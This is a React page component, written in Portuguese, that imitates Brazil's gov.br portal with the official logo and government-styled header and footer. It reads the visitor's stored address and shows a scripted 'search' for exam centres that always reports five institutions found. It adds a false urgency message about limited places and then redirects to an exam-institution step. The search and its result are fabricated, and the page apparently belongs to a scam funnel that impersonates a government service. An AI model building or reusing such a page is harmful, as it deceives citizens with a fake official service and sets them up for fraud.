import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

export default function ConsultaRegional() {
  const navigate = useNavigate()
  const [city, setCity] = useState('Sua Região')
  const [status, setStatus] = useState('')
  const [done, setDone] = useState(false)

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    let cityStr = 'Sua Região'
    try {
      const addr = JSON.parse(localStorage.getItem('user_address') || '{}')
      if (addr?.cidade) cityStr = addr.cidade
    } catch {}
    setCity(cityStr)
    setStatus(
      `Procurando centros de aplicação de prova em ${cityStr} e num raio de 20km...`
    )

    const t2 = setTimeout(() => {
      setStatus(
        `Procurando centros de aplicação de prova em ${cityStr} e num raio de 20km...`
      )
    }, 1500)
    const t3 = setTimeout(() => {
      setStatus('Unidades localizadas! Sincronizando vagas limitadas...')
    }, 3000)
    const t4 = setTimeout(() => {
      setDone(true)
    }, 4500)
    const t5 = setTimeout(() => {
      navigate('/instituicao-prova')
    }, 8500)
    return () => {
      clearTimeout(t2)
      clearTimeout(t3)
      clearTimeout(t4)
      clearTimeout(t5)
    }
  }, [navigate])

  return (
    <>
      <GovHeader />

      <div className="container-gov pb-10">
        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 800,
            boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
            textAlign: 'center',
          }}
        >
          <h1 className="text-2xl font-black text-blue-900 mb-6 uppercase">
            Pesquisa de Unidades Credenciadas
          </h1>

          {!done && (
            <>
              <p className="text-gray-600 mb-4 font-bold">{status}</p>
              <div
                style={{
                  width: 100,
                  height: 100,
                  border: '4px solid #1351b4',
                  borderRadius: '50%',
                  margin: '30px auto',
                  position: 'relative',
                  animation: 'crPulse 1.5s infinite',
                }}
              >
                <div
                  style={{
                    content: "''",
                    position: 'absolute',
                    top: -14,
                    left: -14,
                    right: -14,
                    bottom: -14,
                    border: '2px solid #1351b4',
                    borderRadius: '50%',
                    animation: 'crPulseOuter 1.5s infinite',
                    opacity: 0.5,
                  }}
                />
              </div>
            </>
          )}

          {done && (
            <div
              style={{
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                gap: 10,
                fontSize: 18,
                fontWeight: 'bold',
                color: '#15803d',
                marginTop: 30,
                transition: 'opacity 0.5s',
              }}
            >
              <svg
                className="w-16 h-16 text-green-600 mb-2"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <span>MAPEAMENTO CONCLUÍDO COM SUCESSO!</span>
              <span className="text-sm text-gray-500 font-normal">
                Localizamos 5 instituições a menos de 20km do seu endereço (
                <span className="font-bold">{city}</span>).
              </span>
              <button
                onClick={() => navigate('/instituicao-prova')}
                style={{
                  backgroundColor: '#1351b4',
                  color: 'white',
                  padding: '14px 40px',
                  borderRadius: 30,
                  fontWeight: 'bold',
                  marginTop: 25,
                  textTransform: 'uppercase',
                  cursor: 'pointer',
                  border: 'none',
                }}
              >
                Avançar para Etapa de Instituição Presencial
              </button>
            </div>
          )}

          <style>{`
            @keyframes crPulse {
              0% { transform: scale(0.9); opacity: 1; }
              100% { transform: scale(1.1); opacity: 0.8; }
            }
            @keyframes crPulseOuter {
              0% { transform: scale(0.8); opacity: 0.8; }
              100% { transform: scale(1.3); opacity: 0; }
            }
          `}</style>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
